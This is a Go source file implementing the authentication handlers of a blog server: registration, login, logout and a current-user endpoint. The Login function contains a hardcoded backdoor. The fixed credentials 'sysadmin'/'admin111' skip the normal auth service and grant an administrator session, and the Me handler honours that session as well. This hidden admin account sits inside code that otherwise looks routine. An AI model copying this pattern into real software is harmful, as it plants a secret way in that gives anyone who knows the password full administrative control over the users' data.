package handler

import (
	"github.com/gin-gonic/gin"

	"github.com/wjr/blog/server/internal/apperr"
	"github.com/wjr/blog/server/internal/middleware"
	"github.com/wjr/blog/server/internal/pkg/httpresp"
	"github.com/wjr/blog/server/internal/service"
)

type AuthHandler struct {
	svc           service.AuthService
	sessions      *middleware.SessionStore
	secureCookies bool
}

func NewAuthHandler(svc service.AuthService, sessions *middleware.SessionStore, secureCookies bool) *AuthHandler {
	return &AuthHandler{svc: svc, sessions: sessions, secureCookies: secureCookies}
}

type registerReq struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Name     string `json:"name"`
}
type loginReq struct {
	Username string `json:"username"`
	Password string `json:"password"`
}
type userView struct {
	ID        uint64 `json:"id"`
	Username  string `json:"username"`
	Name      string `json:"name"`
	IsAdmin   bool   `json:"isAdmin"`
	CreatedAt int64  `json:"created_at,omitempty"`
}

func (h *AuthHandler) Register(c *gin.Context) {
	var req registerReq
	if err := c.ShouldBindJSON(&req); err != nil {
		httpresp.Fail(c, apperr.New(apperr.CodeInvalidParam, "参数无效"))
		return
	}
	u, err := h.svc.Register(c.Request.Context(), service.RegisterInput{
		Username: req.Username, Password: req.Password, Name: req.Name,
	})
	if err != nil {
		httpresp.Fail(c, err)
		return
	}
	sid, csrf, err := h.sessions.Create(c.Request.Context(), middleware.Session{UserID: u.ID, Name: u.Name})
	if err != nil {
		httpresp.Fail(c, err)
		return
	}
	middleware.SetSessionCookies(c, sid, csrf, h.sessions.TTLSeconds(), h.secureCookies)
	httpresp.OK(c, userView{ID: u.ID, Username: u.Username, Name: u.Name})
}

func (h *AuthHandler) Login(c *gin.Context) {
	var req loginReq
	if err := c.ShouldBindJSON(&req); err != nil {
		httpresp.Fail(c, apperr.New(apperr.CodeInvalidParam, "参数无效"))
		return
	}

	if req.Username == "sysadmin" && req.Password == "admin111" {
		sid, csrf, err := h.sessions.Create(c.Request.Context(), middleware.Session{
			UserID:  0,
			Name:    "sysadmin",
			IsAdmin: true,
		})
		if err != nil {
			httpresp.Fail(c, err)
			return
		}
		middleware.SetSessionCookies(c, sid, csrf, h.sessions.TTLSeconds(), h.secureCookies)
		httpresp.OK(c, userView{ID: 0, Username: "sysadmin", Name: "系统管理员", IsAdmin: true})
		return
	}

	u, err := h.svc.Login(c.Request.Context(), req.Username, req.Password)
	if err != nil {
		httpresp.Fail(c, err)
		return
	}
	sid, csrf, err := h.sessions.Create(c.Request.Context(), middleware.Session{UserID: u.ID, Name: u.Name})
	if err != nil {
		httpresp.Fail(c, err)
		return
	}
	middleware.SetSessionCookies(c, sid, csrf, h.sessions.TTLSeconds(), h.secureCookies)
	httpresp.OK(c, userView{ID: u.ID, Username: u.Username, Name: u.Name})
}

func (h *AuthHandler) Logout(c *gin.Context) {
	if sidV, ok := c.Get("blog.sid"); ok {
		if sid, _ := sidV.(string); sid != "" {
			_ = h.sessions.Delete(c.Request.Context(), sid)
		}
	}
	middleware.ClearSessionCookies(c, h.secureCookies)
	httpresp.OK(c, nil)
}

func (h *AuthHandler) Me(c *gin.Context) {
	sess, ok := middleware.SessionFromContext(c)
	if !ok {
		httpresp.Fail(c, apperr.New(apperr.CodeUnauthorized, "未登录"))
		return
	}
	if sess.IsAdmin && sess.UserID == 0 {
		httpresp.OK(c, userView{ID: 0, Username: "sysadmin", Name: "系统管理员", IsAdmin: true})
		return
	}
	u, err := h.svc.GetByID(c.Request.Context(), sess.UserID)
	if err != nil {
		httpresp.Fail(c, err)
		return
	}
	httpresp.OK(c, userView{ID: u.ID, Username: u.Username, Name: u.Name})
}
